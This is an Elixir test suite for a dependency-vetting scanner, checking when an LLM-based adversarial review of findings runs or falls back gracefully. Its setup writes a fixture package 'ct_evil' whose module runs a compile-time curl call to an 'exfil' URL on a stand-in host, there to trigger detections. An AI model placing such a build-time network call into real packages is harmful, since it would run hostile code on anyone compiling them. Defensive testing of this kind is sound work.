defmodule VetCore.Integration.AdversarialGateIntegrationTest do
  @moduledoc """
  Integration tests for the adversarial-LLM gate in the scanner.

  The scanner only invokes `LLMReview.review_with_refutation/2` when:

    1. `opts[:adversarial]` is truthy, AND
    2. the dep has at least one finding, AND
    3. the dep's initial risk score meets `adversarial_threshold`.

  When the gate is closed, findings must pass through unchanged. When
  the gate is open but the API is unavailable (no key), the scanner must
  degrade gracefully: log a warning, keep the original findings.

  These tests never actually hit the Anthropic API — they verify the gate
  logic deterministically in the absence of a key.
  """

  use ExUnit.Case, async: false

  setup do
    tmp =
      Path.join(
        System.tmp_dir!(),
        "vet_adversarial_integration_#{System.unique_integer([:positive])}"
      )

    File.mkdir_p!(tmp)

    # Remember and clear ANTHROPIC_API_KEY so the gate observes "no key".
    original_key = System.get_env("ANTHROPIC_API_KEY")
    System.delete_env("ANTHROPIC_API_KEY")

    on_exit(fn ->
      File.rm_rf!(tmp)
      if original_key, do: System.put_env("ANTHROPIC_API_KEY", original_key)
    end)

    dep_dir = Path.join([tmp, "deps", "ct_evil", "lib"])
    File.mkdir_p!(dep_dir)

    File.write!(Path.join(dep_dir, "evil.ex"), ~S"""
    defmodule CtEvil do
      @token System.cmd("curl", ["https://example.test/exfil"])
    end
    """)

    File.write!(Path.join([tmp, "deps", "ct_evil", "mix.exs"]), ~S"""
    defmodule CtEvil.MixProject do
      use Mix.Project
      def project, do: [app: :ct_evil, version: "0.1.0"]
    end
    """)

    File.write!(
      Path.join(tmp, "mix.lock"),
      ~s(%{\n  "ct_evil": {:hex, :ct_evil, "0.1.0", "a", [:mix], [], "hexpm", "b"},\n})
    )

    %{project_path: tmp}
  end

  describe "gate closed: no :adversarial option" do
    test "findings are unmodified — no :llm_confirmed evidence_level appears", %{project_path: path} do
      {:ok, report} = VetCore.scan(path, skip_hex: true, skip_history: true)
      [dr] = report.dependency_reports

      refute Enum.any?(dr.findings, &(&1.evidence_level == :llm_confirmed))
    end

    test "evidence_level stays :pattern_match or :corroborated (scanner's own promotions only)",
         %{project_path: path} do
      {:ok, report} = VetCore.scan(path, skip_hex: true, skip_history: true)
      [dr] = report.dependency_reports

      allowed = [:pattern_match, :corroborated, :sandbox_observed, :llm_confirmed, :known_incident]

      for f <- dr.findings do
        assert f.evidence_level in allowed
      end

      # In this fixture the scanner's correlate_findings should NOT kick in
      # (no apply/3 + network combo), so we specifically expect no
      # :llm_confirmed without the adversarial flag set.
      refute Enum.any?(dr.findings, &(&1.evidence_level == :llm_confirmed))
    end
  end

  describe "gate open: adversarial: true but no API key" do
    test "scanner degrades gracefully, preserving findings", %{project_path: path} do
      # The adversarial path fails with :missing_api_key; the scanner logs a
      # warning and falls back to the pre-adversarial findings. The scan
      # itself must still succeed.
      log =
        ExUnit.CaptureLog.capture_log(fn ->
          assert {:ok, report} =
                   VetCore.scan(path,
                     skip_hex: true,
                     skip_history: true,
                     adversarial: true
                   )

          [dr] = report.dependency_reports
          assert dr.findings != []

          # No finding was promoted to :llm_confirmed — the API never ran.
          refute Enum.any?(dr.findings, &(&1.evidence_level == :llm_confirmed))
        end)

      assert log =~ "adversarial review failed" or log =~ "missing_api_key"
    end

    test "risk_score is unchanged vs a non-adversarial scan (no API effects)",
         %{project_path: path} do
      {:ok, baseline} = VetCore.scan(path, skip_hex: true, skip_history: true)

      _log =
        ExUnit.CaptureLog.capture_log(fn ->
          {:ok, adv} =
            VetCore.scan(path,
              skip_hex: true,
              skip_history: true,
              adversarial: true
            )

          for {a, b} <- Enum.zip(baseline.dependency_reports, adv.dependency_reports) do
            assert a.risk_score == b.risk_score
            assert a.risk_level == b.risk_level
          end
        end)
    end
  end

  describe "gate threshold" do
    test "adversarial_threshold higher than the dep score short-circuits silently",
         %{project_path: path} do
      # ct_evil has a compile-time System.cmd → score is high. If we demand
      # a threshold of 200 (impossible), the gate closes and findings are
      # unchanged — no warning about missing API key either.
      log =
        ExUnit.CaptureLog.capture_log(fn ->
          {:ok, report} =
            VetCore.scan(path,
              skip_hex: true,
              skip_history: true,
              adversarial: true,
              adversarial_threshold: 200
            )

          [dr] = report.dependency_reports
          refute Enum.any?(dr.findings, &(&1.evidence_level == :llm_confirmed))
        end)

      # No API call attempted → no "adversarial review failed" warning.
      refute log =~ "adversarial review failed"
    end
  end

  describe "gate: no findings → no API call attempted" do
    test "a clean dep never triggers the adversarial pipeline" do
      clean_tmp =
        Path.join(
          System.tmp_dir!(),
          "vet_adversarial_clean_#{System.unique_integer([:positive])}"
        )

      File.mkdir_p!(clean_tmp)
      on_exit(fn -> File.rm_rf!(clean_tmp) end)

      dir = Path.join([clean_tmp, "deps", "clean_pkg", "lib"])
      File.mkdir_p!(dir)

      File.write!(Path.join(dir, "clean.ex"), "defmodule CleanPkg do\n  def x, do: 1\nend\n")

      File.write!(Path.join([clean_tmp, "deps", "clean_pkg", "mix.exs"]), ~S"""
      defmodule CleanPkg.MixProject do
        use Mix.Project
        def project, do: [app: :clean_pkg, version: "1.0.0"]
      end
      """)

      File.write!(
        Path.join(clean_tmp, "mix.lock"),
        ~s(%{\n  "clean_pkg": {:hex, :clean_pkg, "1.0.0", "a", [:mix], [], "hexpm", "b"},\n})
      )

      log =
        ExUnit.CaptureLog.capture_log(fn ->
          {:ok, report} =
            VetCore.scan(clean_tmp,
              skip_hex: true,
              skip_history: true,
              adversarial: true
            )

          [dr] = report.dependency_reports
          assert dr.findings == []
        end)

      # No findings → no adversarial attempt → no warning.
      refute log =~ "adversarial review failed"
    end
  end
end
